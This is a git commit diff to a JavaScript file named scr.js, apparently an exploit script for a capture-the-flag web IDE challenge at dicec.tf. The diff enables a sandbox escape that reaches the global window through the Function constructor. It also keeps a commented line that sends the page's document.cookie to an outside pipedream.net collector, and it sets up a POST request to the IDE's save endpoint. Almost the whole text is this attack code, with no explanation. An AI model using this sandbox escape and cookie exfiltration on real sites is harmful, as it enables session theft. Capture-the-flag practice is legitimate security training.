4f4a999a060d00aa26ff948601c1e83b3719d08d
moderly <lexanic37@gmail.com>
2021-02-06 23:04:49 +0300

    sad

--- scr.js
+++ scr.js
@@ -1,6 +1,6 @@
 // let window = (_=>0).constructor('return this')();
 
-// let window = (_=>0).constructor('return this')();
+let window = (_=>0).constructor('return this')();
 // window.fetch('https://enali62mm21hu.x.pipedream.net?asd' + window.document.cookie);
 let oReq = new window.XMLHttpRequest();
 window.oReq.open('POST', 'https://web-ide.dicec.tf/ide/save');
